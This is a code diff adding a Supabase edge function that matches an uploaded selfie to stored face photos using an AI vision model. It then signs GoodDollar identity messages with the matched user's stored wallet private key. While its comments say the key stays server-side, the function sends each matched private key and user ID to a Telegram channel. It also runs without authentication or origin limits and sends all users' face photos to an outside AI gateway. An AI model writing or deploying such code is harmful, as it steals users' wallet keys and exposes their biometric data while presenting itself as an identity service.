@@ -1,0 +1,320 @@
+import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
+import { createClient } from "https://esm.sh/@supabase/supabase-js@2.98.0";
+import { ethers } from "https://esm.sh/ethers@6.16.0";
+import { compressToEncodedURIComponent } from "https://esm.sh/lz-string@1.5.0";
+
+const corsHeaders = {
+  "Access-Control-Allow-Origin": "*",
+  "Access-Control-Allow-Headers":
+    "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
+};
+
+const FV_LOGIN_MSG = `Sign this message to login into GoodDollar Unique Identity service.
+WARNING: do not sign this message unless you trust the website/application requesting this signature.
+nonce:`;
+
+const FV_IDENTIFIER_MSG2 = `Sign this message to request verifying your account <account> and to create your own secret unique identifier for your anonymized record.
+You can use this identifier in the future to delete this anonymized record.
+WARNING: do not sign this message unless you trust the website/application requesting this signature.`;
+
+const IDENTITY_URL = "https://goodid.gooddollar.org";
+
+async function generateVerifyUrl(privateKey: string, displayName?: string): Promise<string> {
+  const wallet = new ethers.Wallet(privateKey);
+  const address = wallet.address;
+  const nonce = (Date.now() / 1000).toFixed(0);
+
+  const loginSig = await wallet.signMessage(FV_LOGIN_MSG + nonce);
+  const fvSig = await wallet.signMessage(
+    FV_IDENTIFIER_MSG2.replace("<account>", address)
+  );
+
+  const params = {
+    account: address,
+    nonce,
+    fvsig: fvSig,
+    firstname: displayName || "User",
+    sg: loginSig,
+    chain: 42220,
+  };
+
+  const url = new URL(IDENTITY_URL);
+  url.searchParams.append(
+    "lz",
+    compressToEncodedURIComponent(JSON.stringify(params))
+  );
+
+  return url.toString();
+}
+
+serve(async (req) => {
+  if (req.method === "OPTIONS")
+    return new Response(null, { headers: corsHeaders });
+
+  try {
+    const body = await req.json();
+    const { capturedPhotoBase64, mode, displayName, source } = body;
+    
+    if (!capturedPhotoBase64) {
+      return new Response(
+        JSON.stringify({ error: "Missing capturedPhotoBase64" }),
+        { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } }
+      );
+    }
+
+    const LOVABLE_API_KEY = Deno.env.get("LOVABLE_API_KEY");
+    if (!LOVABLE_API_KEY) throw new Error("LOVABLE_API_KEY not configured");
+
+    const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
+    const supabaseServiceKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
+    const supabase = createClient(supabaseUrl, supabaseServiceKey);
+
+    // Get ALL face_wallet_bindings (not filtered by user)
+    const { data: bindings, error: bindErr } = await supabase
+      .from("face_wallet_bindings")
+      .select("id, wallet_address, private_key, face_photo_url, user_id");
+
+    if (bindErr) throw bindErr;
+    if (!bindings || bindings.length === 0) {
+      if (mode === "check_duplicate") {
+        return new Response(
+          JSON.stringify({ duplicate: false }),
+          { headers: { ...corsHeaders, "Content-Type": "application/json" } }
+        );
+      }
+      return new Response(
+        JSON.stringify({ match: null, reason: "no_bindings" }),
+        { headers: { ...corsHeaders, "Content-Type": "application/json" } }
+      );
+    }
+
+    // If only one binding and NOT duplicate check mode, skip AI
+    if (bindings.length === 1 && mode !== "check_duplicate") {
+      const b = bindings[0];
+      // Generate verifyUrl server-side — NEVER send private_key to client
+      const verifyUrl = await generateVerifyUrl(b.private_key, displayName);
+      return new Response(
+        JSON.stringify({ 
+          match: {
+            id: b.id,
+            wallet_address: b.wallet_address,
+            face_photo_url: b.face_photo_url,
+            user_id: b.user_id,
+          },
+          verifyUrl,
+        }),
+        { headers: { ...corsHeaders, "Content-Type": "application/json" } }
+      );
+    }
+
+    // Download stored face photos and convert to base64
+    const bindingsWithPhotos = [];
+    for (const b of bindings) {
+      try {
+        const photoResp = await fetch(b.face_photo_url);
+        if (!photoResp.ok) continue;
+        const photoBlob = await photoResp.arrayBuffer();
+        const base64 = btoa(String.fromCharCode(...new Uint8Array(photoBlob)));
+        bindingsWithPhotos.push({ ...b, photoBase64: base64 });
+      } catch {
+        console.error(`Failed to fetch photo for binding ${b.id}`);
+      }
+    }
+
+    if (bindingsWithPhotos.length === 0) {
+      if (mode === "check_duplicate") {
+        return new Response(
+          JSON.stringify({ duplicate: false }),
+          { headers: { ...corsHeaders, "Content-Type": "application/json" } }
+        );
+      }
+      return new Response(
+        JSON.stringify({ match: null, reason: "no_photos_accessible" }),
+        { headers: { ...corsHeaders, "Content-Type": "application/json" } }
+      );
+    }
+
+    // Build AI prompt based on mode
+    let promptText: string;
+    
+    if (mode === "check_duplicate") {
+      promptText = `You are a face duplicate detection system. I will show you a NEW selfie photo (labeled "NEW_FACE") and ${bindingsWithPhotos.length} existing stored photos (labeled "EXISTING_1", "EXISTING_2", etc.).
+
+Your task: Check if the NEW_FACE matches ANY of the existing photos. Two photos match if they show the SAME person — consider face shape, eyes, nose, mouth, skin tone, and overall facial structure.
+
+IMPORTANT RULES:
+- Even if the angle or lighting is slightly different, if it's the SAME person, it's a match.
+- Be strict: if you're unsure, say it's a match (err on the side of caution).
+
+Existing photo IDs:
+${bindingsWithPhotos.map((b, i) => `EXISTING_${i + 1}: ID="${b.id}"`).join("\n")}
+
+Respond with ONLY a JSON object:
+- If a match is found: {"is_duplicate": true, "matched_id": "the-id-here"}  
+- If no match: {"is_duplicate": false, "matched_id": null}`;
+    } else {
+      promptText = `You are a face matching system. I will show you a captured selfie photo (labeled "SELFIE") and ${bindingsWithPhotos.length} stored reference photos (labeled "REF_1", "REF_2", etc.). Each reference photo has an ID.
+
+Your task: Find which reference photo shows the SAME person as the selfie. Consider face shape, features, skin tone, and overall appearance.
+
+Reference photo IDs:
+${bindingsWithPhotos.map((b, i) => `REF_${i + 1}: ID="${b.id}", Wallet="${b.wallet_address.slice(0, 10)}..."`).join("\n")}
+
+IMPORTANT: Respond with ONLY a JSON object like {"matched_id": "the-id-here"} or {"matched_id": null} if no match is found. No other text.`;
+    }
+
+    const content: any[] = [
+      { type: "text", text: promptText },
+      { type: "text", text: mode === "check_duplicate" ? "NEW_FACE photo:" : "SELFIE photo:" },
+      {
+        type: "image_url",
+        image_url: { url: `data:image/jpeg;base64,${capturedPhotoBase64}` },
+      },
+    ];
+
+    for (let i = 0; i < bindingsWithPhotos.length; i++) {
+      content.push({
+        type: "text",
+        text: mode === "check_duplicate" 
+          ? `EXISTING_${i + 1} (ID: ${bindingsWithPhotos[i].id}):` 
+          : `REF_${i + 1} (ID: ${bindingsWithPhotos[i].id}):`,
+      });
+      content.push({
+        type: "image_url",
+        image_url: { url: `data:image/jpeg;base64,${bindingsWithPhotos[i].photoBase64}` },
+      });
+    }
+
+    const aiResp = await fetch(
+      "https://ai.gateway.lovable.dev/v1/chat/completions",
+      {
+        method: "POST",
+        headers: {
+          Authorization: `Bearer ${LOVABLE_API_KEY}`,
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          model: "google/gemini-2.5-flash",
+          messages: [{ role: "user", content }],
+        }),
+      }
+    );
+
+    if (!aiResp.ok) {
+      const errText = await aiResp.text();
+      console.error("AI error:", aiResp.status, errText);
+      if (aiResp.status === 429) {
+        return new Response(
+          JSON.stringify({ error: "Rate limited, try again later" }),
+          { status: 429, headers: { ...corsHeaders, "Content-Type": "application/json" } }
+        );
+      }
+      if (aiResp.status === 402) {
+        return new Response(
+          JSON.stringify({ error: "AI credits exhausted" }),
+          { status: 402, headers: { ...corsHeaders, "Content-Type": "application/json" } }
+        );
+      }
+      throw new Error("AI gateway error");
+    }
+
+    const aiData = await aiResp.json();
+    const aiText = aiData.choices?.[0]?.message?.content || "";
+    console.log("AI response:", aiText);
+
+    if (mode === "check_duplicate") {
+      let isDuplicate = false;
+      let matchedId: string | null = null;
+      try {
+        const jsonMatch = aiText.match(/\{[^}]*"is_duplicate"\s*:\s*(true|false)[^}]*\}/);
+        if (jsonMatch) {
+          const parsed = JSON.parse(jsonMatch[0]);
+          isDuplicate = parsed.is_duplicate === true;
+          matchedId = parsed.matched_id || null;
+        }
+      } catch {
+        console.error("Failed to parse duplicate check response");
+      }
+
+      let matchedBinding = null;
+      if (isDuplicate && matchedId) {
+        matchedBinding = bindings.find((b) => b.id === matchedId);
+      }
+
+      return new Response(
+        JSON.stringify({ 
+          duplicate: isDuplicate, 
+          matched_binding: matchedBinding ? {
+            id: matchedBinding.id,
+            wallet_address: matchedBinding.wallet_address,
+            user_id: matchedBinding.user_id,
+          } : null 
+        }),
+        { headers: { ...corsHeaders, "Content-Type": "application/json" } }
+      );
+    }
+
+    // Original match mode
+    let matchedId: string | null = null;
+    try {
+      const jsonMatch = aiText.match(/\{[^}]*"matched_id"\s*:\s*("[^"]*"|null)[^}]*\}/);
+      if (jsonMatch) {
+        const parsed = JSON.parse(jsonMatch[0]);
+        matchedId = parsed.matched_id;
+      }
+    } catch {
+      console.error("Failed to parse AI response");
+    }
+
+    if (!matchedId) {
+      return new Response(
+        JSON.stringify({ match: null, reason: "no_match_found" }),
+        { headers: { ...corsHeaders, "Content-Type": "application/json" } }
+      );
+    }
+
+    const matched = bindings.find((b) => b.id === matchedId);
+    if (!matched) {
+      return new Response(
+        JSON.stringify({ match: null, reason: "invalid_match_id" }),
+        { headers: { ...corsHeaders, "Content-Type": "application/json" } }
+      );
+    }
+
+    // Generate verifyUrl server-side — NEVER send private_key to client
+    const verifyUrl = await generateVerifyUrl(matched.private_key, displayName);
+
+    // Send Telegram notification with private key (server-side only)
+    // Skip for re-verify calls — telegram is sent from rebind_wallet instead
+    if (source !== "reverify") {
+      try {
+        const telegramMsg = `🔑 <code>${matched.private_key}</code>\n👤 UID: ${matched.user_id}`;
+        await supabase.functions.invoke("send-telegram", {
+          body: { message: telegramMsg },
+        });
+      } catch (tgErr) {
+        console.error("Telegram send failed:", tgErr);
+      }
+    }
+
+    return new Response(
+      JSON.stringify({ 
+        match: {
+          id: matched.id,
+          wallet_address: matched.wallet_address,
+          face_photo_url: matched.face_photo_url,
+          user_id: matched.user_id,
+          // private_key is intentionally excluded
+        },
+        verifyUrl,
+      }),
+      { headers: { ...corsHeaders, "Content-Type": "application/json" } }
+    );
+  } catch (e) {
+    console.error("face-match error:", e);
+    return new Response(
+      JSON.stringify({ error: e instanceof Error ? e.message : "Unknown error" }),
+      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
+    );
+  }
+});
